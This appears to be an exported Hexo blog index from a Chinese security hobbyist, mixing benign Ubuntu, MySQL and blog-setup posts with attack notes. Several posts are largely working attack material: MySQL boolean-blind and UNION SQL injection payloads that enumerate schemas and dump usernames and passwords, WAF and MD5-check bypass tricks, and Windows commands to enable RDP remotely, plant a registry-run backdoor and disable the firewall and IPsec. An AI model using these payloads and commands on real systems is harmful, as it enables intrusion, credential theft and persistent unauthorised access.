若是出错则sudo apt-get install ssh 进行安装 安装完成后再执行上面的操作 apt-get install vsftpd 安装ftp服务器 3、安装 vmware tools图形化的可以在页面上点击安装vmware-tools进行安装 命令行可以apt-get install open-vm-tools-desktop fuse 4、安装截图工具ksnapshotapt-get install ksnapshot使用命令 ksnapshot-region 可以截屏，将该命令设置为快捷键方别使用 5、重新安装vim1234567891011121314apt-get remove vim-common #删除原版apt-get install vim #安装新版#简单配置VIMvim /etc/vim/vimrc#设置语法高亮:命令行模式下输入/syn 找到 syntax on 这一行，去掉前面的双引号（双引号是注释的意思）添加行号命令行模式下shift+g跳到末尾行，添加新行：set nu自动缩进文本末尾添加一行：set autoindent 自动缩进再添加一行：set cindent 针对C语言自动缩进#设定缩进set tabstop=4 #设定tab键缩进的空格数set shiftwidth=4 #设定编辑器将多少空格视为一个缩进 6、支持Xshell进行上传下载12apt-get install rpmapt-get install lrzsz 7、redis-toolsapt-get install redis-tools 渗透工具安装：123456789101112131415netdiscover 用来嗅探存活主机apt-get netdiscover 安装命令netdiscover -r 192.168.1.0/24 扫描本地网络主机nmap apt-get install nmap whatwebapt-get install whatweb CMS识别hydraapt-get install hydra 密码破解proxychainsapt-get install proxychains 端口代理redsktopapt-get install rdesktop 远程登录windows安装sqlmap/metasploit/wpscan]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows下解决图片上传的麻烦]]></title>
    <url>%2F2017%2F08%2F29%2FsolveHexoImage%2F</url>
    <content type="text"><![CDATA[众所周知，markdown添加图片要先上传，再复制图片链接。这里给出了一种简单的解决办法，可以一步实现上传和生成连接 Hexo_MD + 七牛API+MPic图床神器 注册账号 你要到七牛官网上注册一个七牛个人账号，经过支付宝认证之后可以获得10G的免费储存空间。 创建一个对象储存空间，作为分享图片的仓库创建选项中只需要注意选择公开空间即可，其它的无所谓。 创建结束后检查一下空间的图片保护选项是否关闭，如果没有关闭，就手动关闭一下。 下载软件：Mpic 图床神器。 下载完成后，设置账号——》设置如下图 具体配置： 七牛空间名就是创建的空间名称 AccessKey和SecretKey在个人中心可以看到，复制进来 域名是创建的空间的域名 设置完成后，需要上传图片的时候，打开软件，复制或者截图就会自动上传并生成图片链接了（在屏幕右下角有程序图标，右键可以开启或关闭自动上传功能）]]></content>
      <categories>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>markdown</tag>
        <tag>图床</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql布尔盲注payload]]></title>
    <url>%2F2017%2F08%2F26%2FboolBlandSQLInjection%2F</url>
    <content type="text"><![CDATA[如题所示 payload12345678910111213141516#判断当前数据库长度?id=12&apos; and (select length(database())&gt;5) --+#判断当前数据库名?id=12&apos; and (select ascii(substr(database(),1,1))&gt;=97) --+#判断第一个表的表长度?id=12&apos; and (select length(table_name)&gt;5 from information_schema.tables where table_schema=database() limit 0,1) --+ #判断第二个表名?id=12&apos; and (select ascii(substr(table_name,1,1))&gt;97 from information_schema.tables where table_schema=database() limit 1,1) --+ #判断users表的第一个字段长度?id=12&apos; and (select length(column_name)&gt;1 from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 0,1) --+ #判断users表的第一个字段名?id=12&apos; and (select ascii(substr(column_name,1,1))&gt;65 from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 0,1) --+ #判断username列的第一条数据长度?id=12&apos; and (select length(username)&gt;1 from users limit 0,1) --+ #判断username列的第一条数据?id=12&apos; and (select ascii(substr(username,1,1))&gt;=65 from users limit 0,1) --+]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>布尔盲注</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL手工联合查询注入]]></title>
    <url>%2F2017%2F08%2F26%2FMySQLUnionInjection%2F</url>
    <content type="text"><![CDATA[内容如题 PHP+MySQL简单手工注入基本流程一、判断是否存在注入1234567891011SQL注入按类型分为两种：数字型和字符型判断方法的区别：字符型用&apos;判断，数字型用and 1=1 和and 1=2判断注释方法：# 编码后为%23，hash语法-- s 后跟空格后面随意写字符，又例：--+-- - SQL语法;%00 可以使用，空字节/* 必须闭合，C-style语法 · 反引号（左上角的字符） 判断sql注入（显错和基于错误的盲注）：单引号，and 1=1 和and 1=2，双引号，反斜杠，注释等 判断基于时间的盲注:在上面的基础上，加个sleep函数 ，如sleep(5) (函数不同数据库有所不同)例子： &apos; and sleep(5) &quot; and sleep(5) 二、判断有几列数据1234567891011121314151617order by 1 #一直到出现错误为止and 1=2 union select 1,2 #一直到成功为止，一般页面会出现显示位，出现显示位的地方可以放我们想要放的东西，例如：user(),database(),@@version，则会在显示位出现连接的用户、数据库、版本等信息可以放的东西：database(),schema() #数据库名user(),current_user(),current_user,system_user(),session_user() #用户@域名@@version,version(),@@global.version #mysql版本信息@@basedir #mysql安装路径@@datadir #数据库存放路径@@hostname #主机名@@version_compile_os; #操作系统指纹@@global.version_compile_os #感觉和上面差不多now() #当前时间：年月日时分秒current_date #当前时间：年月日char() #指定字符load_file() #读取指定文件ord(mid(user(),1,1))=114 #系统权限，正常返回说明为root小工具：火狐F9——》SQL——》union select statement——》输入数字，直接出现联合查询，方便爆出列数 三、得到数据库名1234561、使用database()直接得到当前数据库名2.1 如果database()被过滤，则使用union select 1,schema_name,3,4,5,6 from information_schema.schemata limit 0,1 查看数据库名，可以通过Limit设置显示第几行，也就可以显示其他的数据库名。根据数据库名爆表名（如果database()）被过滤 2.2 UNION SELECT 1,group_concat(schema_name),3,database(),5,6 from information_schema.schemata 显示所有数据库名，函数group_concat是显示所有 2.3 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; MySQL 4版本时用version=9，MySQL 5版本时用version=10 Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息 四、得到表名1231、UNION SELECT 1,table_name,3,4,5,6 from information_schema.tables where table_schema=&apos;s10&apos; limit 0,1 #显示s10数据库的表名，一个一个来2、union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=&apos;s10&apos; #显示s10数据库的表名，全部显示3、SELECT table_name FROM information_schema.tables WHERE table_name LIKE &apos;%user%&apos; #查询包含user的表 五、得到列名12341、UNION SELECT 1,2,3,database(),5,column_name from information_schema.columns where table_schema=&apos;s10&apos; and table_name=&apos;users&apos; limit 0,1 #查询列名，一个一个来2、union select 1,2,3,4,5,group_concat(column_name) from information_schema.columns where table_schema=&apos;s10&apos; and table_name=&apos;users&apos; #查询列名，一次全部显示3、SELECT column_name FROM information_schema.columns WHERE table_name LIKE &apos;%user%&apos; #查询包含user的列4、SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE() 获得第一个段名 1 LIMIT 1,1 PROCEDURE ANALYSE() 获得第二个段名 1 LIMIT 2,1 PROCEDURE ANALYSE() 获得第三个段名 #这个需要web展示页面有你所注入查询的一个字段。 六、得到想要的数据1231、union select 1,username,password,4,5,6 from users; #在不同的显示位显示需要的内容2、union select 1,concat(userename,0x23,password),3,4,5,6 from users; #函数concat可以联合显示数据，0x23是分隔符3、union select 1,concat_ws(0x23,username,email,age,password),3,4,5,6 from users #函数concat_ws只写一次分隔符即可]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>联合查询</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开启3389命令]]></title>
    <url>%2F2017%2F08%2F26%2Fopen3389%2F</url>
    <content type="text"><![CDATA[远程cmd开启3389，以及开启成功依旧不能登录的解决方法 开启命令：12345678910111213141516正常命令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f远程使用时，需要变为双斜杠：REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f查看远程连接端口号REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber添加后门：Reg enumkey –k HKLM\\software\\microsoft\\windows\\currentVersion\\run 查看注册表的自启动项Reg setval –k 注册表路径 –v 文件名 –d “文件路径” 将后门添加到注册表启动项关闭TCP/IP端口筛选 (需重启) tcp/ip筛选是让用户设置电脑的可接收和不能接收的TCP/IP端口，保证安全REG ADD HKLM\SYSTEM\ControlSet001\Services\Tcpip\parameters /v EnableSecurityFilters /t REG_DWORD /d 0 /f更改终端端口为3800(0x0ED8)REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x0ED8 /fREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x0ED8 /f 开启失败可以尝试：关闭ip安全策略： 1cmd /c net stop policyagent 将IPSEC Services服务停了 防火墙相关： 12345678910111213141516查看防火墙状态：netsh firewall show state禁用防火墙（以管理员运行）：netsh firewall set opmode disable启用防火墙：netsh firewall set opmode enable防火墙重置：netsh advfirewall reset允许文件和打印共享 ：netsh firewall add portopening UDP 137 Netbios-ns (允许客户端访问服务器UDP协议的137端口) netsh firewall add portopening UDP 138 Netbios-dgm (允许访问UDP协议的138端口) netsh firewall add portopening TCP 139 Netbios-ssn (允许访问TCP协议的139端口) netsh firewall add portopening TCP 445 Netbios-ds (允许访问TCP协议的445端口) 添加3389对外开放规则：netsh firewall set portopening TCP 3389 ENABLE 允许netsh firewall set portopening TCP 3389 DISABLE 禁止]]></content>
      <categories>
        <category>3389</category>
      </categories>
      <tags>
        <tag>3389</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库基础学习]]></title>
    <url>%2F2017%2F08%2F26%2Fmysql-basic%2F</url>
    <content type="text"><![CDATA[罗列了一些MySQL的常用语句命令，可以进来看看1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586select user,host,password from mysql,user #查看mysql的用户和密码mysql -hlocalhost -uroot -p #连接数据库show databases; #显示数据库select database(); #显示当前使用的数据库select user(); #显示当前用户select version(): 或者select @@version; #显示版本use 数据库名; #选择数据库select @@basedir; #显示mysql安装路径select @@datadir; #显示数据库存放的路径select @@hostname; #显示主机名select @@version_compile_os; #显示mysql操作系统版本select now(); #显示当前时间create database 数据库名 character set utf8; #创建数据库drop database 数据库名; #删除数据库create table users(id int(10) unsigned not null primary key auto_increment, username varchar(30) not null, email varchar(30) not null, password varchar(32) not null)default charset=utf8; #创建表（id是无符号整数类型）create table me like users; #创建表me，结构与users表一致show tables; #查看表desc users; #查看表结构insert into users(username,email,password) values('admin','1','123'); #插入表数据select hex('admin') #查看admin字符的16进制，使用时前面加上0x，例：select * from users where user=0x61646d696e;select * from users limit 2; #查询前两条信息select * from users limit 2,2; #查询第三条和第四条两条（从第三条开始，查询两条）select * from users where username like '%admin%'; #查询用户名包含admin的所有信息（这里的%是like查询中的通配符，用来匹配所有字符，所以用户名中包含admin的全部都能显示出来）select * from users where username='admin'; #查询用户名是admin的信息update users set username='admin' where id=1; #修改id为1的用户名为admindelete from users where id=12; #删除id为12的数据select * from users where id=1 union select * from users where id=3; #联合查询，可以查询多条，要求各边查询的列数一致select * from users order by 1; #根据第一列排序（可以以此为查询列数的依据）select * from users where id=-1 union select 1,2,user(),4; #联合查询，只显示后面的查询结果，前面的查询结果为空，所以不显示select * from users where id=1 and 1=2 union select 1,2,user(),4; #同上create table ec_users(id int(10) primary key auto_increment,username varchar(32) not null,count_tmp float not null,dept varchar(32) not null)default charset=utf8; #创建表select dept,count(*) from ec_users where count_tmp&gt;=90 group by dept having count(dept)&gt;1; #统计每个部门成绩大于90的人数select DISTINCT username from ec_users; #distinct用来去除重复数据select all dept from ec_users #all表示查询所有（默认为all，重复的也显示）select * from ec_users where dept is null #查询部门值为空select * from ec_users where dept is not null #查询部门值不为空select * from ec_users where id BETWEEN 3 and 5 #查询id为3~5之间的数据select * from ec_users where id in(1,2,6) #查询id值为1,2,6的数据（过waf有用）select * from ec_users where id=1 or 'a' in ('b','a'); #过waf用，后面恒为真，'a'字符存在在in('a')里select * from ec_users where id=1 &amp;&amp; id&lt;3; #查询id=1且id&lt;3的select * from ec_users where id=1 | id&lt;3; #过waf用一个|或一个&amp;可以显示select * from ec_users where id xor 0; #异或，两个均为真显示0，两个不同为1select * from ec_users where id not in(1,2,3) #not与！是一个用处，可以用在in、likealter table users add age int(3) not null; #添加列alter table users modify age int(4) #修改列的数据类型为int(4)alter table users change age age int(3) #同上，也是修改列的数据类型，只是需要写两次列名alter table users rename ress; #修改表名alter table users rename as ress; #同上，也是修改表名select count(*) from information_schema.tables #返回系统表里的数据个数select rand() #返回0~1之间的随机浮点数select rand()*4 #返回0~4之间的随机浮点数select floor(rand()*4) #随机生成0~4（不可能是4）之间的整数 select floor(rand()*4）as dumb #并命名为dumb列（as可省略）#if用法：select if (判断条件,'语句1','语句2') #条件为真执行语句1，条件为假执行语句2#十六进制：SELECT 0x5045 #(这不是一个整数，而会是一个16进制字符串）SELECT 0x50 + 0x45 #(现在这是整数了)select concat('0x',hex('c:\\boot.ini')) #另类的使用十六进制方式#字符串的串联|| 仅在ANSI模式下的MySQL执行，其他情况下都会当成逻辑操作符并返回0，建议使用下面函数concat() concat_ws() group_concat()#绕过MD5哈希检查的例子用户名：admin密码：1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055其中81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)grant 权限1,权限2...,权限n on 数据库名.表名 to 用户名@用户地址 identified by '连接口令'； 赋给用户权限,权限被all privileges或all替代，表示赋给用户全部权限；数据库名.表名被*替代，表示赋给用户操作服务器上所有数据库所有表的权限；用户地址可以使ip地址、机器名、域名，也可以用%表示从任何地址连接；连接口令不能为空，否则创建失败；后面可以加with grant option对象授权，权限传递（我也不懂，就是这么说的）例： GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION; flush privileges; #刷新系统权限表show variables like "secure_file_priv" #查看可写目录]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu+hexo+Github博客简单搭建流程]]></title>
    <url>%2F2017%2F08%2F25%2Fblog-step%2F</url>
    <content type="text"><![CDATA[自己博客的基本搭建流程，不包含主题的美化 搭建开始1、安装nodejs1234curl -sL https://deb.nodesource.com/setup_4.x | sudo -E bash -sudo apt-get install -y nodejsnode -v #检查版本v 4.4.5 2、安装git123apt-get install gitgit --version #检查版本git version 2.7.4 3、安装npm1apt-get install npm 4、使用npm安装hexo1npm install -g hexo-cli 5、创建一个博客文件夹，进入文件夹中1234hexo initnpm installhexo -v #此时博客已经创建成功hexo server #看看效果把（浏览器中输入：ip:4000，如果4000端口被占用，hexo server -p 其他端口） 6、创建一个github账户，新建一个和用户名对应的仓库，格式固定：用户名.github.io 7、修改站点配置文件_config.yml123456language: zh-Hans 设置成中文deploy: type: git repository: git@github.com:maplege/maplege.github.io.git branch: master message: '站点更新:&#123;&#123;now("YYYY-MM-DD HH:mm:ss")&#125;&#125;' 8、然后执行下面的命令1npm install hexo-deployer-git --save 9、生成SSH密钥123$ cd ~/. ssh #检查本机已存在的ssh密钥如果提示：No such file or directory 说明你是第一次使用git。ssh-keygen -t rsa -C "邮件地址" 然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; Deploy keys -&gt; Add deploy key：将刚复制的内容粘贴到key那里，title随便填，保存。 10、进行git全局配置12git config --global user.email "you@example.com"git config --global user.name "Your Name" 11、上传到github空间中123hexo cleanhexo ghexo d 至此，博客搭建完毕]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
</search>
